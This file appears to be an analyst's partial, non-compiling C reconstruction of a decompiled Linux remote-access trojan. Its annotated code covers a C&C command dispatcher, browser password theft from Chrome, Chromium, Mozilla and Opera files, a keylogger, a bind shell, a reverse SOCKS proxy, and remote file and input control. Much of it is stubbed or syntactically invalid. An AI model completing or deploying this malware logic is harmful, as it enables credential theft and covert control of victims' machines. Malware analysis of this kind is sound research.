#pragma once

#define true 1
#define false 0

#include <stdint.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/select.h>
#include <sys/time.h>

// Global variables

// .data segment
extern int AuthenticatedSocket; // prob set to -1

// .bss segment
extern char *DecryptionContext;
extern char *EncryptionContext;
extern char *InitializationVector;
extern FILE *TransferList[255];

extern pid_t SearchPId;
extern pid_t ShellPId;

// Function prototypes

void  __attribute__((cdecl)) InitTransfersList ();
int32_t __attribute__((cdecl)) cpSleep(__useconds_t useconds);
void __attribute__((cdecl)) TerminateRunningOperations ();
void __attribute__((cdecl)) AESFreeContext (void *ptr);
void __attribute__((cdecl)) CloseAllTransfers ();
void __attribute__((cdecl)) CloseTransfer (int8_t i);
int32_t __attribute__((cdecl)) IsDataSizeAllowed ();
int32_t __attribute__((cdecl)) ReadPacket (int32_t fd, void *buf, size_t n);
uint32_t __attribute__((cdecl)) ProcessData (int32_t *ptr, int32_t n1, int32_t *filename, int32_t n2);
int32_t __attribute__((cdecl)) IsSocketReadable (int32_t fd);
int32_t __attribute__((cdecl)) StrSplit (int32_t arg_0, int8_t arg_4, int32_t arg_8, void *a4,  uint32_t a5);
int32_t __attribute__((cdecl)) CharPosition (uint8_t a1, int32_t arg_4);
uint8_t __attribute__((cdecl)) cpDownloadFile (int32_t a1);
void __attribute__((cdecl)) SendDownloadStatus (int32_t a1, int32_t a2);
void __attribute__((cdecl)) ReleaseHeap (uint32_t ptr);
void cpLogonSessions (uint32_t fd);







void  __attribute__((cdecl)) InitTransfersList () {
	for (int i = 0 ; i <  255; ++i) {
		TransferList[i] = '\0';
	}
}

int __attribute__((cdecl)) cpSleep(__useconds_t useconds) {
	usleep (useconds);
}



void __attribute__((cdecl)) TerminateRunningOperations () {

	if (DecryptionContext != 0) {
		AESFreeContext(&DecryptionContext);
	}

	if (EncryptionContext != 0) {
		AESFreeContext(&EncryptionContext);
	}

	// CloseX11Connection ();

	CloseAllTransfers ();
}

// This function is a very simple wrapper that deallocates things from the heap
void __attribute__((cdecl)) AESFreeContext (void *ptr) {

	if (ptr != NULL) {
		free (ptr);
	}
}


void __attribute__((cdecl)) CloseAllTransfers () {
	for (int i = 0; i < 255; ++i)
		CloseTransfer (i);
}

void __attribute__((cdecl)) CloseTransfer (int8_t i) {
	if (i != 0xFF) {
		fclose (TransferList[i]);
	}
}

int32_t __attribute__((cdecl)) IsDataSizeAllowed () {


}

// This function is a simple wrapper
int32_t __attribute__((cdecl)) ReadPacket (int32_t fd, void *buf, size_t n) {

	int32_t return_value = -1;

	// 0FFFFFFFFh = 4294967295
	if (fd != -1 && (IsSocketReadable(fd) != 0)) {
		// Why not use higher level wrappers ?
		return_value = recv (fd, buf, n, 0);
	}
	return return_value;
}

// This function will simply keep on waiting until a socket becomes readable
// and returns a non zero value when 'fd' is readable
int32_t __attribute__((cdecl)) IsSocketReadable (int32_t fd) {

	// Set of file descriptors to read from
	fd_set readfds;

	// Time the process is willing to wait when
	struct timeval timeout;

	int ret;

	while (1) {
		// Suspend the process until something happens
		// **SKIPPED SOME STUFF

		ret = select (fd, &readfds, 0, 0, &timeout);

		if (ret != 0) {
			if (ret > 0) {
				if (___errno_location () != 4) {
					return 0;
				}
			} else {
				// returns something along this line
				// **SKIPPED SOME STUFF
				return readfds.__fds_bits;
			}
		} else {
			if (SendData (fd, 2, 0, 0) == 0) {
				CloseSocket (fd);
			}
		}
	}
}

uint32_t __attribute__((cdecl)) ProcessData (int32_t *ptr, int32_t n1, int32_t *filename, int32_t n2) {
	// status          = dword ptr -283Ch
	// var_2838        = word ptr -2838h
	// ptr             = dword ptr -282Ch
	// var_2828        = word ptr -2828h
	// new             = byte ptr -182Ch
	int32_t v32;			// Holds the result of the 'StrToInt' conversion
	int32_t cpy_ptr;		// I just had to make ends meet
	uint8_t old;
	// var_2C          = dword ptr -2Ch
	// var_28          = dword ptr -28h
	// var_24          = dword ptr -24h
	// var_20          = dword ptr -20h

	// 0x3D = 61d

	// variable that we'll use to direct code execution
	int32_t switch_path;

	int8_t jump_to_default = false;

	if ((uint8_t )(n1 - 1) <= 0x3D) {
		if (n2 == 0 && AuthenticatedSocket == n1 && DecryptionContext == '\0') {
			AESCryptCFB (DecryptionContext, 2, n2,  &InitializationVector, filename, filename);
		}

		switch_path = (uint8_t )(n1 - 1);

		switch (switch_path) {

		case 0:

			...

			GetMozillaProductPasswords ();
			
			break;

		case 2:
			GetOperaWand (...);
			SendData (...);
			break;


		case 3:
			GetGoogleChromePasswords ();
			break;

		case 4:

			break;

		// case 43u in IDA
		case 5:

			ptr = malloc (0x3310);
			ptr = cpy_ptr;

			if (ptr) {

				// Even though these weird numbers are passed to the function, alignment
				// will increase the amount

				// With the newly allocated memory
				StrSplit ((int)filename, 7, 1, ptr, 4352);
				StrSplit ((int)filename, 7, 2, ptr + 1088, 4352);
				StrSplit ((int)filename, 7, 3, ptr + 2176, 4352);
				StrSplit ((int)filename, 7, 4, &old, 2048);
				ptr[3265] = StrToInt(&old);

				StrSplit ((int)filename, 7, 5, &old, 0x800);
				__snprintf_chk(ptr[2176], 4352, 1, 4352, "/tmp/%s");
				StrSplit ((int)filename, 7, 5, &old, 0x800);
				v32 = StrToInt(&old);
				ptr[3267] = 0;
				ptr[3266] = 0;
				// *((_BYTE *)ptr + 13056) = v32 != 0;
// LABEL_54:
				// Starts a new thread and passes a function 'cpDownloadFile'
				cpy_ptr = (uint32_t *)cpBeginThread((void *(*)(void *))cpDownloadFile, ptr);
				return cpy_ptr;
			}
			break;
		case 6:
			// int __cdecl GetMozillaProductPasswords(int a1)
			GetMozillaProductPasswords ();

			// Formats the data in order to transmit it on the network
			aStrConcatenate ();

			// The data is sent back to the server
			SendData (...);

			ReleaseHeap (...);
		}

		case 7:

			TerminateRunningOperations ();
			CloseSocket ();
			cpSleep (2000);
			exit(0);

			break;

		case 8:

			UninstallHost ();
			TerminateRunningOperations ();
			CloseSocket ();
			CloseMutexHandle ();
			exit(0);

			break;

		case 9:

			...

			cpListDrives ();

			break;

		case 11:

			...

			cpListFiles ();

			break;

		case 13:

			...

			cpBeginThread (&TransferFile (), arg);

			break;

		case 15:
		case 18:

			CloseTransfer (i);

			...

			break;

		case 16:

			...
			
			cpDownloadFile ();

			break;


		case 17:

			// Write a file and upload it
			FileUploadWrite (fd, element, n);

			break;

		case 19:

			...
			
			cpBeginThread(cpCopyFile(), arg);

			break;

		case 20:

			cpExecuteFile (file_path, file_args, 1);

			break;



		case 21:

			cpRenameFile (old_name, new_name);

			break;


		case 22:

			cpDeleteFile (filename);
			
			break;


		case 23:

			cpMkDir (path);

			break;

		case 27:

			IsX11LibAPILoaded ();

			cpBeginThread (BindShell (), fd);


			break;

		case 29:

			WriteCommand (&buf);

			break;

		case 31:

			...

			cpSystemInformation (fd);
			
			break;


		case 33:

			...

			cpLogonSessions (cpCopyFile(), arg);

			break;

		case 35:

			// Pretty self explainatory, nothing too fancy (at first sight)
			cpListProcesses (fd);
			
			break;


		case 37:

			cpKillProcess (proc_to_kill);

			break;

		case 38:

			ListWindows (fd);

			break;

		case 39:

			ProcessWindowCommand (<an int number>);

			break;

		case 43:

			cpKeyUp ();

			break;

		case 44:

			cpKeyDown ();

			break;

		case 45:

			cpMouseUp ();

			break;


		case 46:

			cpMouseDown ();

			break;

		case 47:

			cpMouseMove ();

			break;

		case 48:

			cpScreenCapture ();

			break;

		case 62:

			...
			
			cpDownloadFile ();

			break;

		case 28:

			if () {
				;
			}

			break;

		case 40:

			// who
			TranslateMacros ();
			//
			cpBeginThread(cpDownloadFile (),);

			break;

		case 42:

			// 
			 ();
			// Downloads a file
			cpBeginThread(cpDownloadFile (), "/tmp/%s");

			break;

		case 55:

			...



			break;

		case 61:

			// What is a reverse socket ?
			// By deduction, it is a socket initiated by the other end in the
			// same way a reverse shell would

			cpBeginThread (&StartReverseSocks(), arg);

			break;

		default:

			GetMozillaProductPasswords(1);

            GetGoogleChromePasswords();
            
            // Basically creates a string containing whatever information is 
            // found in the previous functions
        	aStrConcatenate(&v49, -1, &v50, -1, 1);

            GetChromiumPasswords();
            aStrConcatenate(&v49, -1, &v50, -1, 1);

            GetMozillaProductPasswords(6);
            aStrConcatenate(&v49, -1, &v50, -1, 1);

            GetOperaWand(&v52);
			aStrConcatenate(&v49, v51, &v50, v52, 1);
            
            break;
	}

	// switch (n1) {

	// case constant-expression  :
	// 	statement(s);
	// 	break; /* optional */

	// case constant-expression  :
	// 	statement(s);
	// 	break; /* optional */

	// /* you can have any number of case statements */
	// default : /* Optional */
	// 	statement(s);
	// }


	// After case 1
}


int32_t __attribute__((cdecl)) StartReverseSocks (void * sockfd) {

	EstablishConnection ();

	// Sends 
	if ( send (sockfd, buf, len, flags) ) {
		// wat
		HandleReverseSocks ();
		CloseSocket ();
	}

	ReleaseHeap ();

}




// I'll deal with this function once I'll figure out what a reverse sockets is

int32_t __attribute__((cdecl)) HandleReverseSocks (int32_t *a1) {

	/*
	 * Declaration of variables used
	 * ...
	 */

	// The programs waits a notifictaion, until then the specified sockets
	// aren't considered ready for read operations
	select (fd, &readfds, 0, 0, &timeout);

	// ...
	recv (fd, buf, len, flags);

	// ...

		recv (fd, buf, 6, flags);
	// The amount of bytes read changes according to the amount of bytes read

	if (buf == 1) {

		recv (fd, buf, 6, flags);
		addr.sa_data[] = ; 
	} else {
		// Looks alot like the size of an array
		recv (fd, buf, 256, flags);

	}
}


int32_t __attribute__((cdecl)) StrSplit (int32_t arg_0, int8_t arg_4, int32_t arg_8, void *a4, uint32_t a5) {

	int32_t return_value = -1;
	int8_t var_18;
	int32_t var_14;
	int32_t ret;

	if (arg_0 == 0) {
		return return_value;
	}

	memset(arg_8, 0, sizeof(arg_8));

	var_18 = arg_4;

	ret = CharPosition (var_18, arg_0);

	var_14 = arg_8 - 1;

	if (var_14 < 0) {
		if (ret == -1) {
			return -1;
		} else {

		}
	}

}


// I can't figure out why the decompiler treats arg_4 as a integer instead of a
// pointer
int32_t __attribute__((cdecl)) CharPosition (uint8_t a1, int32_t arg_4) {

	int32_t found = false;
	int32_t return_value = 0;

	if (arg_4 == 0) {
		return 0;
	}

	while ((uint8_t *)(arg_4) != '\0') {

		if ((uint8_t *)(arg_4) == a1) {
			return return_value;
		}
		++return_value;
	}

	return 0;
}


// arg_0= dword ptr  4
// arg_4= byte ptr  8
// arg_8= dword ptr  0Ch
// arg_C= dword ptr  10h
// arg_10= dword ptr  14h



uint8_t __attribute__((cdecl)) cpDownloadFile (int32_t a1) {

	// name
	// buf
	// addr
	// fd
}


// This function formats a string and sends it over an open socket, supposedly the
// CnC
void __attribute__((cdecl)) SendDownloadStatus (int32_t a1, int32_t a2) {

	int32_t result;
	int32_t v3 = 0;

	if (*(int32_t *) a1 + 13068) {
		// asprintf, vasprintf - print to allocated string ...
		// it does this in one step for you - calculates the length of the string,
		// allocates that amount of memory, and writes the string into it.
		result = __asprintf_chk(&v3, 1, "%d\a%d\ahttp://%s%s\a%s", *(uint32_t *)(a1 + 13064), a2, a1 + 4352, a1, a1 + 8704);

		if (result != -1) {
			SendData (*(int32_t *) a1 + 13068, 42, v3, result);
			ReleaseHeap (&v3);
		}
	}
}

void __attribute__((cdecl)) ReleaseHeap (uint32_t ptr) {

	if (ptr != NULL) {
		free (ptr);
	}
}


void __attribute__((cdecl)) SendData (int32_t fd ,int32_t v1,int32_t v2,int32_t v3) {
	printf("hi m8\n");
}

BOOL __attribute__((cdecl)) cpBeginThread (void *(*start_routine)(void *), void *arg) {

  pthread_t newthread; 
  return pthread_create(&newthread, 0, start_routine, arg) == 0;
  
}



// This function creates a copy of the '~/.opera/wand.dat',
// more info @ http://securityxploded.com/operapasswordsecrets.php
int32_t __attribute__((__cdecl)) GetOperaWand (uint32_t *a1) {
	// Get the content of the $HOME env var
	char * homepath = getenv("HOME");
	char * filename;
	...

  	filename = __snprintf_chk(&v9, 4352, 1, 4352, "%s/.opera/wand.dat", homepath);

  	// Opens a '~/.opera/wand.dat'
  	_fopen64 (filename, "rb");

  	// Gets the filesize
  	cpGetFileSize (...);

  	// Reads from the entire file
  	_fread (output, member_filesize, , input);
  	...

}


int32_t __attribute__((__cdecl)) cpGetFileSize (int a1) {

}

int32_t GetGoogleChromePasswords () {
  char v0; // dl@1
  int result; // eax@1
  char v2; // [sp+4h] [bp-110Ch]@1

  v0 = GetLoginDataPath((char *)4, &v2, 4352);
  result = 0;
  if ( v0 )
    result = DecryptLoginData(4, &v2);
  return result;
}


int32_t __attribute__((cdecl)) GetLoginDataPath (char * browser_name, char * result, int a3) {
  char * homepath;

  if ( name == (char *)4 )
  {
    homepath = getenv("HOME");
    __snprintf_chk(result, a3, 1, -1, "%s/.config/google-chrome/Default/Login Data", homepath);
  }
  else if ( name == (char *)5 )
  {
    homepath = getenv("HOME");
    __snprintf_chk(result, a3, 1, -1, "%s/.config/chromium/Default/Login Data", homepath);
  }

  return cpFileExists (result);
}


BOOL InstallHost () {

	// Opens a semaphore so that only one malware instances runs on the system
	OpenMutexHandle ();

	// 

	// Start keylogger
	cpBeginThread (cpStartKeylogger(), NULL);
	return ;
}


uint8_t UninstallHost () {

	FILE * stream;
	char * filename;
	// If we are
	if (IsOptionEnabled (8)) {
		getenv("HOME");
	    filename = __snprintf_chk(&filename, 4352, 1, 4352, "%s/.config/autostart/%s.desktop");
	    cpDeleteFile(&filename);
	}

	if ( !(IsOptionEnabled (4) )) {
		// It closes a socket, not sure which one
		_fclose64(stream);
	}
}


// This functions clears < w0t > if the trojan isn't doing something
uint8_t cpClearLog () {
	
	uint8_t result = IsOptionEnabled(64);

	if ( result )
    	result = sub_8054C98 (0, 0, 1);

  	return result;
}


void ListWindows (int , int fd) {

	// This variable represents wot ?
	Display monitor;
	int32_t var = 0;


	IsX11LibAPILoaded (&monitor);

	EnumerateWindows (monitor, monitor->screens[monitor->default_screen].root, 0, &var);


	return ;
}


// This function is called by functions that deal with gui in some ways. I'm not
// what the author wanted to achieve is a connection to a remote X server.
// *NOTE*: (we're not enstablishing a remote connection with the X server, as
// there's an already open backdoor).
// After that, our calling function is ready to fulfill whatever goal it had.
BOOL IsX11LibAPILoaded (Display &monitor) {

	// It first checks whether "/usr/lib32" exists
	// The resasong behind such a seemingly useless check, is that we can tell
	// which kind of library the system is using, therefore its architecture
	// (32 / 64 bit)

	if (cpDirectoryExists ("/usr/lib32") == TRUE) {

		cpFindFile ("/usr/lib32", "libX11.so*", ..., ...);
		cpFindFile ("/usr/lib32/i386-linux-gnu", "", ..., ...);

	} else {

		cpFindFile ("/usr/lib", "libX11.so*", ..., ...);
		cpFindFile ("/usr/lib/i386-linux-gnu", "libX11.so*", ..., ...);
	}

	cpLodaLibrary (file);

	cpGetProcAddress (&handle, "XOpenDisplay");

	cpGetProcAddress (&handle, "XQuery tree");

	. . .
	// T
}



// 
ProcessWindowCommand () {

}


// This function literally logs the 'log' file that keeps track of logins.
// Example of a login row:
// shxdow   tty1         :1               Tue Apr  4 12:14 - 12:14  (00:00)
void cpLogonSessions (uint32_t fd) {

	struct utmp * line_record;

	// Sets the pointer to beginning of the file
	setutxent ();


	while (1) {
		// Read a line from the login file
		line_record = getutxent ();

		// To put it simply, it writes to a string the entire record previously read

		...


		__asprintf_chk(
		             &result,
		             1,
		             "%d\a%s\a%s\a%s\a%.2d/%.2d/%d %.2d:%.2d:%.2d\a%s\a",
		             line_record->ut_type,
		             line_record->ut_user,
		             line_record->ut_id,
		             line_record->ut_line,
		             time_stamp->tm_mday,
		             time_stamp->tm_mon + 1,
		             time_stamp->tm_year + 1900,
		             time_stamp->tm_hour,
		             time_stamp->tm_min,
		             time_stamp->tm_sec,
		             line_record->ut_host);

		...

		SendData (data, fd, ..., ...);

	}

	...
}


int32_t __attribute__((cdecl)) FileUploadWrite (int32_t fd, int32_t element, int32_t n) {

	int32_t result = 0;

	result = IsTransferOpen (element);

	...

	// Create the file
	result = fwrite (n, , , s);

	...

	// Send it back to the CnC
	result = SendData (fd, ..., ..., ...);

	...

	// Free up resources
	result = CloseTransfer (element);

	return result;
}




int32_t  __attribute__((cdecl)) cpStartKeylogger () {
	
	// It isn't importat to fully grasp the types of this variables

	Display *display; // informations regarding the windows
	int32_t n_devices;
	XDevice *device;
    int32_t KEY_PRESS_TYPE;
    XKeyEvent *single_event;
    Window root;
	XEventClass event_class; // all the events we want to capture

	...

	// LoadKeyloggerAPI:	Loads all the X11 necessary API
	LoadKeyloggerAPI ();

	...

	// Get a list with input devices
	XDeviceInfo *devices = XListInputDevices (display , &n_devices);


	for (int32_t i = 0; i < n_devices; ++i) {

		// The XOpenDevice request makes an input device accessible to a
		// client through input extension protocol requests. If
		// successful, it returns a pointer to an XDevice structure.

		device = XOpenDevice( display, devices[i].id );
		

	    // DeviceKeyPress:
	    // returns the DeviceKeyPress event type and the eventclass for
	    // DeviceKeyPress events from the specified device.

	    // This eventclass can then be used in an XSelectExtensionEvent
	    // request to ask the server to send DeviceKeyPress events from
	    // this device. When a selected event is received via XNextEvent,
	    // the type can be used for comparison with the type in the event.

        DeviceKeyPress( device, KEY_PRESS_TYPE, event_class );

		XSelectExtensionEvent( display, root, &event_class, 1 );

		// Log all keys
		while (TRUE) {
			// Gets an event from the 'XEvent' queue
			NextEvent (&display, &single_event);
			LogKey (single_event, display);
		}
	}

	...

}